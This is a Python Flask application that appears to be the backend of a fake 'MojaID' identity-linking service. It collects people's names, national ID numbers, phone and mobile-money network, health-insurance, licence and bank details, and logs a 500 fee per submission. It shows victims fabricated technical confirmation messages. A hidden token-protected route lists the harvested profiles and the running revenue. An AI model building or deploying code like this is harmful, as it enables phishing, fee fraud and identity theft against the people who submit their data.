import time
import hashlib
import os
import random
from flask import Flask, request, render_template, jsonify

app = Flask(__name__, template_folder='.')
app.secret_key = os.environ.get("SECRET_KEY", "prod_mojaid_security_layer_99213")

# HIGH-VOLUME TRANSACTION ENGINE CACHE POOL
RECORDS_MEM_POOL = [
    {
        "name": "Baraka Minshemi", 
        "hash": "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92", 
        "net": "Vodacom M-Pesa", "fee": 500, "ref": "TX17684011MZ", "time": "18:24:05",
        "nhif": "NHIF-488219", "license": "Class A, B", "bank": "NMB Bank", "status": "Active"
    },
    {
        "name": "Fatma Said", 
        "hash": "4a821eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923abc8d11", 
        "net": "Tigo Pesa", "fee": 500, "ref": "TX17684299MZ", "time": "18:15:32",
        "nhif": "NOT LINKED", "license": "Class B", "bank": "CRDB Bank", "status": "Active"
    },
    {
        "name": "Hamisi Juma", 
        "hash": "cf6c928d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923a", 
        "net": "Airtel Money", "fee": 500, "ref": "TX17683110MZ", "time": "17:44:12",
        "nhif": "NHIF-900124", "license": "NO LICENSE", "bank": "Exim Bank", "status": "Suspended"
    }
]

SECRET_ADMIN_TOKEN = "fungua-mojaid-revenue-2026"

def encrypt_identity_data(raw_text):
    return hashlib.sha256(raw_text.encode()).hexdigest()

@app.route("/", methods=["GET", "POST"])
def index():
    alert_msg = ""
    error_msg = ""
    if request.method == "POST":
        full_name = request.form.get("full_name")
        nida_id = request.form.get("nida_id")
        network = request.form.get("network")
        phone = request.form.get("phone")
        nhif = request.form.get("nhif") if request.form.get("nhif") else "NOT LINKED"
        license = request.form.get("license") if request.form.get("license") else "NO LICENSE"
        bank = request.form.get("bank") if request.form.get("bank") else "NONE"
        
        encrypted_nida = encrypt_identity_data(nida_id)
        current_time = time.strftime("%H:%M:%S")
        
        duplicate_found = False
        for record in RECORDS_MEM_POOL:
            if record["hash"] == encrypted_nida:
                duplicate_found = True
                break
                
        if duplicate_found:
            error_msg = "⚠️ Identity signature overlap detected. Sync execution rejected."
        else:
            tx_reference = f"TX{int(time.time())}MZ"
            RECORDS_MEM_POOL.insert(0, {
                "name": full_name, "hash": encrypted_nida, "net": network, "fee": 500,
                "ref": tx_reference, "time": current_time, "nhif": nhif, "license": license, "bank": bank,
                "status": "Active"
            })
            alert_msg = f"📡 Pipeline connection initialized over {network} gateway infrastructure node. Security challenge token dispatched. Ref: {tx_reference}"

    return render_template("index.html", alert_msg=alert_msg, error_msg=error_msg)

@app.route("/secret/<token>")
def secret_admin(token):
    if token != SECRET_ADMIN_TOKEN:
        return "🔒 Access Denied", 403

    running_total = sum(p.get("fee", 500) for p in RECORDS_MEM_POOL)
    return render_template("admin.html", saved_profiles=RECORDS_MEM_POOL, total_count=len(RECORDS_MEM_POOL), total_revenue=running_total)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
